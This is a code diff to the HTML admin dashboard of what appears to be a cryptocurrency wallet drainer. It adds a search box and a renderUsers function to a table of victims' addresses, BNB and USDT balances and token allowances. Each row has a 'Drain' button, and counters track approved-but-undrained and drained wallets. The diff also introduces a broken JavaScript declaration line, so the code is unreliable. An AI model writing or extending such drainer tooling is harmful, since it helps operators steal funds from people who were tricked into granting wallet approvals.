@@ -128,9 +128,12 @@
     </div>
     <div class="section-full">
       <div class="card">
-        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;flex-wrap:wrap;gap:10px">
           <h2 style="margin:0">Connected Users</h2>
-          <span style="font-size:12px;color:var(--muted)" id="lastUpdate"></span>
+          <div style="display:flex;gap:8px;align-items:center">
+            <input type="text" id="searchId" placeholder="Search ID / Address" style="width:160px;padding:8px 10px;font-size:12px" oninput="filterUsers()">
+            <span style="font-size:12px;color:var(--muted)" id="lastUpdate"></span>
+          </div>
         </div>
         <div style="overflow-x:auto">
           <table class="users-table">
@@ -154,7 +157,7 @@
     </div>
   </div>
   <script>
-    let adminPass = localStorage.getItem('adminPass') || '';
+    let adminPass; let allUsers = []; = localStorage.getItem('adminPass') || '';
     async function api(path, opts = {}) {
       const headers = Object.assign({ 'Content-Type': 'application/json', 'x-admin-pass': adminPass }, opts.headers || {});
       const res = await fetch(path, Object.assign({}, opts, { headers }));
@@ -227,26 +230,8 @@
     async function loadUsers() {
       try {
         const users = await api('/api/admin/users');
-        const tbody = document.getElementById('usersBody');
-        if (!users.length) {
-          tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;color:var(--muted)">No users yet</td></tr>';
-        } else {
-          tbody.innerHTML = users.map(u => `
-            <tr>
-              <td class="mono" title="${u.address}">${short(u.address)}</td>
-              <td>${parseFloat(u.balanceBNB||0).toFixed(4)}</td>
-              <td>${parseFloat(u.balanceUSDT||0).toFixed(2)}</td>
-              <td>${u.allowance === 'unlimited' || parseFloat(u.allowance)>1e10 ? 'MAX' : (u.allowance||'0')}</td>
-              <td><span class="badge badge-${badgeClass(u)}">${u.status||'connected'}</span></td>
-              <td>${formatDate(u.connectedAt)}</td>
-              <td>
-                <button class="btn btn-outline btn-sm" onclick="refreshUser('${u.id}')">Refresh</button>
-                <button class="btn btn-green btn-sm" onclick="drainUser('${u.id}')" ${u.drained?'disabled':''}>Drain</button>
-                <button class="btn btn-red btn-sm" onclick="deleteUser('${u.id}')">X</button>
-              </td>
-            </tr>
-          `).join('');
-        }
+        allUsers = users;
+        renderUsers(users);
         document.getElementById('statTotal').textContent = users.length;
         document.getElementById('statApproved').textContent = users.filter(u => u.approved && !u.drained).length;
         document.getElementById('statDrained').textContent = users.filter(u => u.drained).length;
@@ -301,6 +286,39 @@
       await api('/api/admin/user/' + id, { method: 'DELETE' });
       loadUsers();
     }
+    
+    function filterUsers() {
+      const q = (document.getElementById('searchId').value || '').toLowerCase().trim();
+      if (!q) { renderUsers(allUsers); return; }
+      const filtered = allUsers.filter(u => 
+        (u.id||'').toLowerCase().includes(q) || 
+        (u.address||'').toLowerCase().includes(q) ||
+        (u.id||'').slice(0,8).toLowerCase() === q
+      );
+      renderUsers(filtered);
+    }
+    function renderUsers(users) {
+      const tbody = document.getElementById('usersBody');
+      if (!users.length) {
+        tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;color:var(--muted)">No users</td></tr>';
+        return;
+      }
+      tbody.innerHTML = users.map(u => `
+        <tr>
+          <td class="mono" title="${u.address}">${short(u.address)}<br><span style="font-size:10px;color:var(--muted)">ID: ${(u.id||'').slice(0,8)}</span></td>
+          <td>${parseFloat(u.balanceBNB||0).toFixed(4)}</td>
+          <td>${parseFloat(u.balanceUSDT||0).toFixed(2)}</td>
+          <td>${u.allowance === 'unlimited' || parseFloat(u.allowance)>1e10 ? 'MAX' : (u.allowance||'0')}</td>
+          <td><span class="badge badge-${badgeClass(u)}">${u.status||'connected'}</span></td>
+          <td>${formatDate(u.connectedAt)}</td>
+          <td>
+            <button class="btn btn-outline btn-sm" onclick="refreshUser('${u.id}')">Refresh</button>
+            <button class="btn btn-green btn-sm" onclick="drainUser('${u.id}')" ${u.drained?'disabled':''}>Drain</button>
+            <button class="btn btn-red btn-sm" onclick="deleteUser('${u.id}')">X</button>
+          </td>
+        </tr>
+      `).join('');
+    }
     function showMsg(text, type) {
       const el = document.getElementById('globalMsg');
       el.innerHTML = '<div class="msg msg-' + type + '">' + text + '</div>';
@@ -312,4 +330,4 @@
     }
   </script>
 </body>
-      </html>
+</html>
